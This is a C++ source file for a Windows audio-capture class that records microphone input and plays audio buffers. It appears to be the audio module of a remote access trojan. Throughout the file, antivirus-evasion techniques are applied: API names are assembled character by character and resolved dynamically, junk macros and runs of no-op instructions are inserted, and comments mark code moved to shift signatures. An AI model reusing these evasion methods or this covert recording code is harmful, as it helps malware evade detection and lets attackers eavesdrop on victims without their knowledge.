// Audio.cpp: implementation of the CAudio class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "Audio.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

typedef HANDLE (WINAPI *CreateEventAT)
(
    __in_opt LPSECURITY_ATTRIBUTES lpEventAttributes,
    __in     BOOL bManualReset,
    __in     BOOL bInitialState,
    __in_opt LPCSTR lpName
    );

typedef DWORD (WINAPI *ResumeThreadT)
(
 HANDLE hThread
 );

typedef BOOL (WINAPI *TerminateThreadT)


(
 __in HANDLE hThread,
 __in DWORD dwExitCode
 );

typedef HANDLE (WINAPI *CreateThreadT)
(
 LPSECURITY_ATTRIBUTES lpThreadAttributes,
 DWORD dwStackSize,
 LPTHREAD_START_ROUTINE lpStartAddress,
 LPVOID lpParameter,
 DWORD dwCreationFlags,
 LPDWORD lpThreadId
 );

HMODULE hAudio=NULL;

CAudio::CAudio()
{
	char MyKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyCreateEventA[]={'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
    CreateEventAT pCreateEventA = (CreateEventAT)GetProcAddress(LoadLibrary(MyKernel32),MyCreateEventA);
ANTIVIRUS
	hAudio = LoadLibrary("WINMM.dll");

	m_hEventWaveIn		= pCreateEventA(NULL, false, false, NULL);
	m_hStartRecord		= pCreateEventA(NULL, false, false, NULL);
	m_hThreadCallBack	= NULL;
	m_nWaveInIndex		= 0;
	m_nWaveOutIndex		= 0;
	m_nBufferLength		= 1000; // m_GSMWavefmt.wfx.nSamplesPerSec / 8(bit)

	m_bIsWaveInUsed		= false;
	m_bIsWaveOutUsed	= false;

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioData[i] = new BYTE[m_nBufferLength];
		m_lpInAudioHdr[i] = new WAVEHDR;

		m_lpOutAudioData[i] = new BYTE[m_nBufferLength];
		m_lpOutAudioHdr[i] = new WAVEHDR;
	}
	ANTIVIRUS
	memset(&m_GSMWavefmt, 0, sizeof(GSM610WAVEFORMAT));

	m_GSMWavefmt.wfx.wFormatTag = WAVE_FORMAT_GSM610; // ACM will auto convert wave format
	m_GSMWavefmt.wfx.nChannels = 1;
	m_GSMWavefmt.wfx.nSamplesPerSec = 8000;
__asm nop;
__asm nop;
__asm nop;
__asm nop;
	m_GSMWavefmt.wfx.nAvgBytesPerSec = 1625;
	m_GSMWavefmt.wfx.nBlockAlign = 65;
	m_GSMWavefmt.wfx.wBitsPerSample = 0;
	m_GSMWavefmt.wfx.cbSize = 2;
	__asm nop;
__asm nop;
	m_GSMWavefmt.wSamplesPerBlock = 320;
}
/////////////////////////////////换个位置到这里




/////////////////////////////////换个位置到这里


LPBYTE CAudio::getRecordBuffer(LPDWORD lpdwBytes)
{
	// Not open WaveIn yet, so open it...
	if (!m_bIsWaveInUsed && !InitializeWaveIn())
		return NULL;
ANTIVIRUS
	if (lpdwBytes == NULL)
		return NULL;

	SetEvent(m_hStartRecord);
	WaitForSingleObject(m_hEventWaveIn, INFINITE);
	*lpdwBytes = m_nBufferLength;
	return	m_lpInAudioData[m_nWaveInIndex];
}

bool CAudio::playBuffer(LPBYTE lpWaveBuffer, DWORD dwBytes)
{
	if (!m_bIsWaveOutUsed && !InitializeWaveOut())
		return NULL;

	typedef MMRESULT (WINAPI *waveOutWriteT)(HWAVEOUT,LPWAVEHDR,UINT);
	waveOutWriteT pwaveOutWrite=(waveOutWriteT)GetProcAddress(hAudio,"waveOutWrite");

	for (int i = 0; i < dwBytes; i += m_nBufferLength)
	{
		memcpy(m_lpOutAudioData[m_nWaveOutIndex], lpWaveBuffer, m_nBufferLength);
		__asm nop;
		__asm nop;
		__asm nop;
__asm nop;
		pwaveOutWrite(m_hWaveOut, m_lpOutAudioHdr[m_nWaveOutIndex], sizeof(WAVEHDR));
		m_nWaveOutIndex = 1 - m_nWaveOutIndex;
	}
	return true;
}
/////////////////////////////////换个位置到这里
CAudio::~CAudio()
{
	
	typedef MMRESULT (WINAPI *waveInResetT)(HWAVEIN);
	XJBAV
		XJBQIFA
		SMJJ
		waveInResetT pwaveInReset=(waveInResetT)GetProcAddress(hAudio,"waveInReset");
	XJBQIFA
		XJBQIFA
		typedef MMRESULT (WINAPI *waveInStopT)(HWAVEIN);
	XJBAV
		XJBQIFA
		waveInStopT pwaveInStop=(waveInStopT)GetProcAddress(hAudio,"waveInStop");
	XJBQIFA
		SMJJ
		typedef MMRESULT (WINAPI *waveInCloseT)(HWAVEIN);
	XJBAV
		waveInCloseT pwaveInClose=(waveInCloseT)GetProcAddress(hAudio,"waveInClose");
	XJBQIFA
		SMJJ
		typedef MMRESULT (WINAPI *waveInUnprepareHeaderT)(HWAVEIN,LPWAVEHDR,UINT);
	XJBAV
		waveInUnprepareHeaderT pwaveInUnprepareHeader=(waveInUnprepareHeaderT)GetProcAddress(hAudio,"waveInUnprepareHeader");
	XJBQIFA
		typedef MMRESULT (WINAPI *waveOutResetT)(HWAVEOUT);
	XJBAV
		waveOutResetT pwaveOutReset=(waveOutResetT)GetProcAddress(hAudio,"waveOutReset");
	XJBQIFA
		typedef MMRESULT (WINAPI *waveOutCloseT)(HWAVEOUT);
	XJBAV
		SMJJ
		waveOutCloseT pwaveOutClose=(waveOutCloseT)GetProcAddress(hAudio,"waveOutClose");
	XJBQIFA
		typedef MMRESULT (WINAPI *waveOutUnprepareHeaderT)(HWAVEOUT,LPWAVEHDR,UINT);
	XJBAV
		SMJJ
		waveOutUnprepareHeaderT pwaveOutUnprepareHeader=(waveOutUnprepareHeaderT)GetProcAddress(hAudio,"waveOutUnprepareHeader");
	XJBQIFA
		
		
		if (m_bIsWaveInUsed)
		{
			pwaveInStop(m_hWaveIn);
			pwaveInReset(m_hWaveIn);
			XJBQIFA
				for (int i = 0; i < 2; i++)
					pwaveInUnprepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
				pwaveInClose(m_hWaveIn);
TerminateThreadT pTerminateThreadT= (TerminateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"TerminateThread");
				pTerminateThreadT(m_hThreadCallBack, -1);
		}
		
		if (m_bIsWaveOutUsed)
		{
			pwaveOutReset(m_hWaveOut);
			for (int i = 0; i < 2; i++)
				pwaveOutUnprepareHeader(m_hWaveOut, m_lpInAudioHdr[i], sizeof(WAVEHDR));
			__asm nop;
			__asm nop;
			__asm nop;
			__asm nop;
			pwaveOutClose(m_hWaveOut);
		}		
		
		
		for (int i = 0; i < 2; i++)
		{
			delete [] m_lpInAudioData[i];
			delete m_lpInAudioHdr[i];
			
			delete [] m_lpOutAudioData[i];
			delete m_lpOutAudioHdr[i];
		}
		
		CloseHandle(m_hEventWaveIn);
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
		CloseHandle(m_hStartRecord);
		CloseHandle(m_hThreadCallBack);
ANTIVIRUS
		FreeLibrary(hAudio);
		
}
/////////////////////////////第一个位置换个位置到这里

bool CAudio::InitializeWaveIn()
{
	typedef UINT(WINAPI *waveInGetNumDevsT)(void);
	waveInGetNumDevsT pwaveInGetNumDevs=(waveInGetNumDevsT)GetProcAddress(hAudio,"waveInGetNumDevs");

	if (!pwaveInGetNumDevs())
		return false;
	
	typedef MMRESULT(WINAPI *waveInOpenT)(LPHWAVEIN,UINT,LPCWAVEFORMATEX,DWORD_PTR,DWORD_PTR,DWORD);
SMJJ
	waveInOpenT pwaveInOpen=(waveInOpenT)GetProcAddress(hAudio,"waveInOpen");


	MMRESULT	mmResult;
	DWORD		dwThreadID = 0;
CreateThreadT pCreateThread= (CreateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateThread");
	m_hThreadCallBack = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)waveInCallBack, (LPVOID)this, CREATE_SUSPENDED, &dwThreadID);
	mmResult = pwaveInOpen(&m_hWaveIn, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)dwThreadID, (LONG)0, CALLBACK_THREAD);

	if (mmResult != MMSYSERR_NOERROR)
		return false;

	typedef MMRESULT(WINAPI *waveInPrepareHeaderT)(HWAVEIN,LPWAVEHDR,UINT);
	waveInPrepareHeaderT pwaveInPrepareHeader=(waveInPrepareHeaderT)GetProcAddress(hAudio,"waveInPrepareHeader");

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioHdr[i]->lpData = (LPSTR)m_lpInAudioData[i];
		m_lpInAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpInAudioHdr[i]->dwFlags = 0;
		m_lpInAudioHdr[i]->dwLoops = 0;
		pwaveInPrepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
	}
	
	typedef MMRESULT(WINAPI *waveInAddBufferT)(HWAVEIN,LPWAVEHDR,UINT);
	__asm nop;
	__asm nop;
	__asm nop;
__asm nop;
	waveInAddBufferT pwaveInAddBuffer=(waveInAddBufferT)GetProcAddress(hAudio,"waveInAddBuffer");


	pwaveInAddBuffer(m_hWaveIn, m_lpInAudioHdr[m_nWaveInIndex], sizeof(WAVEHDR));
ResumeThreadT pResumeThread= (ResumeThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"ResumeThread");
	pResumeThread(m_hThreadCallBack);

	typedef MMRESULT(WINAPI *waveInStartT)(HWAVEIN);
SMJJ
	waveInStartT pwaveInStart=(waveInStartT)GetProcAddress(hAudio,"waveInStart");
	pwaveInStart(m_hWaveIn);


	m_bIsWaveInUsed = true;

	return true;

}

bool CAudio::InitializeWaveOut()
{
	typedef UINT(WINAPI *waveOutGetNumDevsT)(void);
	waveOutGetNumDevsT pwaveOutGetNumDevs=(waveOutGetNumDevsT)GetProcAddress(hAudio,"waveOutGetNumDevs");

	if (!pwaveOutGetNumDevs())
		return false;

	for (int i = 0; i < 2; i++)
		memset(m_lpOutAudioData[i], 0, m_nBufferLength);
	
	MMRESULT	mmResult;


	typedef MMRESULT(WINAPI *waveOutOpenT)(LPHWAVEOUT,UINT,LPCWAVEFORMATEX,DWORD_PTR,DWORD_PTR,DWORD);
	waveOutOpenT pwaveOutOpen=(waveOutOpenT)GetProcAddress(hAudio,"waveOutOpen");

	mmResult = pwaveOutOpen(&m_hWaveOut, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)0, (LONG)0, CALLBACK_NULL);
	if (mmResult != MMSYSERR_NOERROR)
		return false;

	typedef MMRESULT(WINAPI *waveOutPrepareHeaderT)(HWAVEOUT,LPWAVEHDR,UINT);
	waveOutPrepareHeaderT pwaveOutPrepareHeader=(waveOutPrepareHeaderT)GetProcAddress(hAudio,"waveOutPrepareHeader");


	for (i = 0; i < 2; i++)
	{
		m_lpOutAudioHdr[i]->lpData = (LPSTR)m_lpOutAudioData[i];
		__asm nop;
		__asm nop;
		__asm nop;
ANTIVIRUS
		m_lpOutAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpOutAudioHdr[i]->dwFlags = 0;
		m_lpOutAudioHdr[i]->dwLoops = 0;
		pwaveOutPrepareHeader(m_hWaveOut, m_lpOutAudioHdr[i], sizeof(WAVEHDR));
	}
	
	m_bIsWaveOutUsed = true;
	return true;
}

DWORD WINAPI CAudio::waveInCallBack( LPVOID lparam )
{
	CAudio	*pThis = (CAudio *)lparam;
	typedef MMRESULT(WINAPI *waveInAddBufferT)(HWAVEIN,LPWAVEHDR,UINT);
	__asm nop;
	__asm nop;
	__asm nop;
__asm nop;
	waveInAddBufferT pwaveInAddBuffer=(waveInAddBufferT)GetProcAddress(hAudio,"waveInAddBuffer");

	MSG	Msg;
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		if (Msg.message == MM_WIM_DATA)
		{
			// 通知的数据到来
			SetEvent(pThis->m_hEventWaveIn);
			// 等待开始下次录音
			WaitForSingleObject(pThis->m_hStartRecord, INFINITE);

			pThis->m_nWaveInIndex = 1 - pThis->m_nWaveInIndex;
			
			MMRESULT mmResult = pwaveInAddBuffer(pThis->m_hWaveIn, pThis->m_lpInAudioHdr[pThis->m_nWaveInIndex], sizeof(WAVEHDR));
			if (mmResult != MMSYSERR_NOERROR)
				return -1;
			
		}

		// Why never happend this
		if (Msg.message == MM_WIM_CLOSE)
			break;

		TranslateMessage(&Msg); 
SMJJ
		DispatchMessage(&Msg);
	}

	return 0;	
}